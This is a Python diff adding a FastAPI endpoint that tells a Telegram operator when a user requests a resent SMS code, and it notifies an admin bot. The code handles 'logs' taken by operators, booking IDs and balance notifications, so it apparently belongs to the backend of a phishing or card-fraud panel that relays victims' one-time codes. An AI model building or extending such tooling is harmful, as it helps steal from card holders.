@@ -94,6 +94,42 @@ def register_endpoints(app: FastAPI, bot: Bot):
             print(f"Error in /notify: {e}")
             return {"status": "error", "message": str(e)}, 500
 
+    @app.post("/resend-sms-notify")
+    async def resend_sms_notify(data: dict):
+        try:
+            session_id = data["sessionId"]
+            
+            log = get_log_by_session(session_id)
+            if not log:
+                return {"status": "error", "message": "Log not found"}
+            
+            booking_id = log['booking_id']
+            client_id = log['client_id']
+            
+            # Отправляем уведомление оператору, который взял лог
+            if log and log['taken_by']:
+                await bot.send_message(
+                    log['taken_by'],
+                    f"#{booking_id} || #{client_id}\n\n"
+                    f"🔄 Пользователь запросил повторную отправку SMS кода"
+                )
+                
+                # Уведомляем админский бот
+                username = "неизвестно"
+                try:
+                    user = await bot.get_chat(log['taken_by'])
+                    username = user.username or "без username"
+                except:
+                    pass
+                
+                await notify_action(booking_id, client_id, username, log['taken_by'], "resend_sms", "🔄 Запрос повторной отправки SMS")
+            
+            return {"status": "ok", "success": True}
+            
+        except Exception as e:
+            print(f"Error in /resend-sms-notify: {e}")
+            return {"status": "error", "message": str(e)}, 500
+
     @app.post("/balance-notify")
     async def balance_notify(data: dict):
         session_id = data["sessionId"]
